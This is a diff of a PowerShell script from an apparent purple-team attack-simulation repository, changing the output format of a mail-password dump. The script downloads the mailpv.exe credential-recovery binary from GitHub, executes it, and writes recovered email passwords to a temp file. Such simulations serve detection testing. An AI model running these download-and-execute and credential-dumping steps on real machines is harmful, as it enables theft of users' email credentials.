@@ -10,13 +10,13 @@ Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
 
 # Download and execute mailpv.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
 $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/mailpv.exe"
-$dumpfile = "$env:tmp\mailpasswords.txt"
+$dumpfile = "$env:tmp\mailpasswords.xml"
 $outfile = "$env:tmp\mailpass.exe"
 try {
     Invoke-WebRequest $url -OutFile $outfile 
     if (Test-Path $outfile){
         Write-Host -ForegroundColor Green "Success: mailpv.exe downloaded to $outfile"
-        & $outfile /stext $dumpfile
+        & $outfile /sxml $dumpfile
     }
     else{
         Write-Host -ForegroundColor Red "Error: Failed to download mailpv.exe, $dumpfile not found."
